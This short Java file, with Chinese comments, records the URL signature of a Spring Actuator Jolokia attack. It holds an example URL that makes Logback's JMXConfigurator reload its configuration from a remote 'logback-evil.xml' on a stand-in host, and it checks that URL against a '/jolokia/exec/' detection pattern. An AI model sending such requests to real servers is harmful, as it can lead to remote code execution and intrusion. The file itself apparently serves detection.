/*
 * [业务问题]: Spring Actuator Jolokia 漏洞特征。
 * [实现逻辑]: 演示通过 Jolokia 触发 Logback 远程配置加载的 URL 特征。
 */
package com.security.bug.feature;

import java.util.regex.Pattern;

/**
 * Actuator + Jolokia 漏洞利用特征。
 */
public class JolokiaAttackUrlFeature {

  static String exampleURL = "http://localhost:8080/"
      + "jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/"
      + "http:!/!/127.0.0.1:8888!/logback-evil.xml";

  public static void main(String[] args) {
    System.out.println(exampleURL);
    System.out.println(Pattern.compile("/jolokia/exec/").matcher(exampleURL).find());
  }
}
